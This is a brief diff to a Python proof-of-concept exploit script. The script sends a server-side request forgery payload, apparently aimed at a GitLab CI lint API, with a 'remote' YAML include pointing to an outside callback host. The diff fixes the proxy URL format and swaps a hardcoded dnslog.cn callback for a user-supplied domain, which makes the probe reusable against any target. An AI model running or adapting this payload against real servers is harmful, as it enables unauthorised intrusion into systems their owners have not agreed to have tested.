@@ -11,7 +11,7 @@ if __name__ == '__main__':
     domain=arguments.domain
 
     req=requests.session()
-    req.proxies = {'http': "127.0.0.1:8080", 'https': "127.0.0.1:8080"}
+    req.proxies = {'http': "http://127.0.0.1:8080", 'https': "http://127.0.0.1:8080"} #python3.7以上代理格式修复
     headers={
         "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
         "Accept-Encoding":"gzip",
@@ -20,7 +20,7 @@ if __name__ == '__main__':
         "Content-Length":"112"
     }
 
-    payload="{ \"include_merged_yaml\": true,\"content\": \"include:\\n  remote: http://1gsn8b.dnslog.cn/api/v1/targets?test.yml\"}"
+    payload="{ \"include_merged_yaml\": true,\"content\": \"include:\\n  remote: http://"+domain+"/api/v1/targets?test.yml\"}"
 
 
 
